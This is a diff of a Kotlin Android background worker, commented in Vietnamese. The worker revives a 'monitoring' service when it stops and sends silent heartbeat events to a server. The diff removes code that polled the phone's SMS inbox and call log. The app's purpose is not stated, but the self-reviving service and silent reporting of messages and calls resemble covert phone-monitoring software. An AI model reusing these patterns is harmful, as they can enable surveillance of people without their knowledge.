@@ -12,46 +12,55 @@ import kotlinx.coroutines.withContext
 class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {
 
     override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
-        val safeContext = applicationContext.deviceProtectedContext()
-
-        if (!AppLifecycleManager.isActivated(safeContext)) {
+        val appContext = applicationContext
+        
+        if (!AppLifecycleManager.isActivated(appContext)) {
             return@withContext Result.success()
         }
 
+        // Kiểm tra AM còn sống không (heartbeat trong 10 phút gần đây)
+        val prefs = appContext.getSharedPreferences("ServiceState", Context.MODE_PRIVATE)
+        val lastHeartbeat = prefs.getLong("last_alarm_heartbeat", 0L)
+        val amAlive = (System.currentTimeMillis() - lastHeartbeat) < 10 * 60 * 1000L
+        
+        if (!amAlive && !isServiceRunning(appContext)) {
+            Log.d("SYNC_WORKER", "🫀 [SyncWorker] AM chết & Service đã chết, gọi đánh thức!")
+            MainActivity.addLog("🫀 [SyncWorker] Service đã chết, đang tự hồi sinh...")
+            AppLifecycleManager.ensureBackgroundRunning(appContext, "WM_STRONG_WAKEUP")
+        } else if (!amAlive) {
+            Log.d("SYNC_WORKER", "✅ AM chết nhưng Service vẫn sống.")
+        } else {
+            Log.d("SYNC_WORKER", "⏺ AM còn sống, WorkManager bỏ qua.")
+        }
+
         return@withContext try {
-            Log.d("SYNC_WORKER", "=== LUONG MANH NHAT DANG CHAY (25 PHUT) ===")
-            
-            val serviceIntent = Intent(applicationContext, BackgroundMonitoringService::class.java)
-            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-                ContextCompat.startForegroundService(applicationContext, serviceIntent)
-            } else {
-                applicationContext.startService(serviceIntent)
-            }
-
-            val smsCount = SmsInboxSync.pollMissingSms(applicationContext, "WM_STRONG")
-            val callCount = CallLogSync.pollMissingCalls(applicationContext, "WM_STRONG")
-            
-            if (smsCount > 0 || callCount > 0) {
-                MainActivity.addLog("🛰️ [WM_STRONG] Đã quét bù: SMS=$smsCount, CALL=$callCount")
-            }
-
             val ok = ServerReporter.sendEventSync(
-                context = applicationContext,
+                context = appContext,
                 type = "HEARTBEAT_STRONG",
                 incomingNumber = "HE_THONG",
-                content = "Ve si manh nhat da kiem tra va hoi sinh he thong.",
+                content = "Ve si manh nhat da kiem tra, service ok.",
                 silent = true
             )
 
             if (ok) {
-                MainActivity.addLog("🫀 [SyncWorker] Đồng bộ định kỳ hoàn tất (25p)")
+                MainActivity.addLog("🫀 [SYS] Kiểm tra Service hoàn tất (20p)")
                 Result.success()
             } else {
                 Result.retry()
             }
         } catch (e: Exception) {
-            Log.e("SYNC_WORKER", "❌ Loi luong manh nhat: \${e.message}")
+            Log.e("SYNC_WORKER", "❌ Loi luong manh nhat: ${e.message}")
             Result.retry()
         }
+    }
+
+    private fun isServiceRunning(context: Context): Boolean {
+        val prefs = context.getSharedPreferences("ServiceState", Context.MODE_PRIVATE)
+        return prefs.getBoolean("is_service_running", false)
+    }
+
+    private fun isWatchdogScheduled(context: Context): Boolean {
+        // Watchdog đã bị vô hiệu hóa, trả về true để SyncWorker không cố đánh thức nó
+        return true
     }
 }
